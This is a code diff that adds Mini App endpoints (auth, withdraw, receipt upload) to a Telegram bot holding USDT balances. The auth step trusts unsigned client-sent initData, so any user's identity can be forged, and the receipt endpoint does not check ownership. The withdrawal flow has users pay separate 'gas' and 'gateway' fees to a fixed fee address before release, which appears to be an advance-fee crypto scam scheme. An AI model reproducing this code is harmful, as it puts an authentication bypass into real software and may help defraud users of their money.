@@ -722,7 +722,183 @@ app.post('/api/connect-uid', (req, res) => {
 // ─── Error handling ───────────────────────────────────────────────────────────
 
 bot.on('polling_error', (err) => console.error('Polling error:', err.message));
+
+// ─── REST API: Auth (for Mini App) ───────────────────────────────────────────
+
+app.post('/api/auth', (req, res) => {
+  try {
+    const { initData } = req.body;
+    
+    // Parse Telegram initData
+    let telegramId = null;
+    let username = '';
+    let fullName = '';
+    
+    if (initData) {
+      try {
+        const params = new URLSearchParams(initData);
+        const userStr = params.get('user');
+        if (userStr) {
+          const userData = JSON.parse(userStr);
+          telegramId = userData.id;
+          username = userData.username || '';
+          fullName = [userData.first_name, userData.last_name].filter(Boolean).join(' ');
+        }
+      } catch(e) {
+        console.log('initData parse error:', e.message);
+      }
+    }
+    
+    if (!telegramId) {
+      return res.status(401).json({ error: 'No Telegram data found. Open this app through Telegram.' });
+    }
+    
+    const user = getOrCreateUser(telegramId, username, fullName);
+    const txs = require('./database').getUserTransactions(user.id, 20);
+    const connections = getUserConnections(user.id);
+    
+    res.json({
+      success: true,
+      user: {
+        telegramId: user.telegram_id,
+        name: user.full_name || user.telegram_username || 'User',
+        username: user.telegram_username,
+        uid: user.uid,
+        trc20Address: user.trc20_address,
+        balance: user.usdt_balance
+      },
+      transactions: txs,
+      connections
+    });
+  } catch (err) {
+    console.error('Auth error:', err);
+    res.status(500).json({ error: 'Server error' });
+  }
+});
+
+// ─── REST API: Withdraw (for Mini App) ───────────────────────────────────────
+
+app.post('/api/withdraw', async (req, res) => {
+  try {
+    const { initData, toAddress, amount, currency, network } = req.body;
+    
+    // Parse telegram ID from initData
+    let telegramId = null;
+    if (initData) {
+      try {
+        const params = new URLSearchParams(initData);
+        const userStr = params.get('user');
+        if (userStr) {
+          const userData = JSON.parse(userStr);
+          telegramId = userData.id;
+        }
+      } catch(e) {}
+    }
+    
+    if (!telegramId) return res.status(401).json({ error: 'Unauthorized' });
+    
+    const user = getUserByTelegramId(telegramId);
+    if (!user) return res.status(404).json({ error: 'User not found' });
+    
+    const withdrawAmt = parseFloat(amount);
+    if (isNaN(withdrawAmt) || withdrawAmt <= 0) return res.status(400).json({ error: 'Invalid amount' });
+    if (withdrawAmt > user.usdt_balance) return res.status(400).json({ error: 'Insufficient balance' });
+    if (withdrawAmt < 1) return res.status(400).json({ error: 'Minimum withdrawal is 1 USDT' });
+    
+    const fees = calculateFees(withdrawAmt);
+    const wr = createWithdrawalRequest({
+      user_id: user.id,
+      to_address: toAddress,
+      network: network || 'TRC20',
+      currency: currency || 'USDT',
+      amount: withdrawAmt,
+      gas_fee: fees.gasFee,
+      gateway_fee: fees.gatewayFee,
+      total_fee: fees.totalFee
+    });
+    
+    res.json({
+      success: true,
+      withdrawal: {
+        id: wr.id,
+        amount: withdrawAmt,
+        toAddress,
+        network: network || 'TRC20',
+        currency: currency || 'USDT',
+        gasFee: fees.gasFee,
+        gatewayFee: fees.gatewayFee,
+        totalFee: fees.totalFee,
+        feeAddress: FEE_ADDRESS,
+        status: 'awaiting_fee'
+      }
+    });
+  } catch (err) {
+    console.error('Withdraw error:', err);
+    res.status(500).json({ error: 'Server error' });
+  }
+});
+
+// ─── REST API: Upload receipt (for Mini App) ─────────────────────────────────
+
+app.post('/api/receipt', async (req, res) => {
+  try {
+    const { initData, withdrawalId, receiptUrl } = req.body;
+    
+    let telegramId = null;
+    if (initData) {
+      try {
+        const params = new URLSearchParams(initData);
+        const userStr = params.get('user');
+        if (userStr) telegramId = JSON.parse(userStr).id;
+      } catch(e) {}
+    }
+    
+    if (!telegramId) return res.status(401).json({ error: 'Unauthorized' });
+    
+    const wr = getWithdrawalById(parseInt(withdrawalId));
+    if (!wr) return res.status(404).json({ error: 'Withdrawal not found' });
+    
+    updateWithdrawal(parseInt(withdrawalId), { status: 'fee_paid', receipt_file_id: receiptUrl || 'web_upload' });
+    
+    const user = getUserByTelegramId(telegramId);
+    
+    // Notify admin
+    await bot.sendMessage(ADMIN_CHAT_ID, `
+🔔 *New Fee Receipt (Web Upload)*
+
+👤 *User:* ${user?.full_name || 'Unknown'} (@${user?.telegram_username || 'N/A'})
+🆔 *Wallet UID:* ${user?.uid}
+🔢 *Request ID:* #${wr.id}
+
+━━━━━━━━━━━━━━━━━━━━
+💰 *Amount:* ${wr.amount} USDT
+📬 *To:* \`${wr.to_address}\`
+⛽ *Gas Fee:* ${wr.gas_fee} USDT
+🏦 *Gateway Fee:* ${wr.gateway_fee} USDT
+💸 *Total Fee:* ${wr.total_fee} USDT
+━━━━━━━━━━━━━━━━━━━━
+
+${receiptUrl ? `Receipt: ${receiptUrl}` : 'Receipt uploaded via web interface'}
+    `.trim(), {
+      parse_mode: 'Markdown',
+      reply_markup: {
+        inline_keyboard: [[
+          { text: '✅ APPROVE', callback_data: `approve_${wr.id}` },
+          { text: '❌ REJECT', callback_data: `reject_${wr.id}` }
+        ]]
+      }
+    });
+    
+    res.json({ success: true, message: 'Receipt submitted for review' });
+  } catch (err) {
+    console.error('Receipt error:', err);
+    res.status(500).json({ error: 'Server error' });
+  }
+});
+
+
+// ─── Error handling ───────────────────────────────────────────────────────────
+
+bot.on('polling_error', (err) => console.error('Polling error:', err.message));
 process.on('uncaughtException', (err) => console.error('Uncaught Exception:', err));
 process.on('unhandledRejection', (err) => console.error('Unhandled Rejection:', err));
-
-
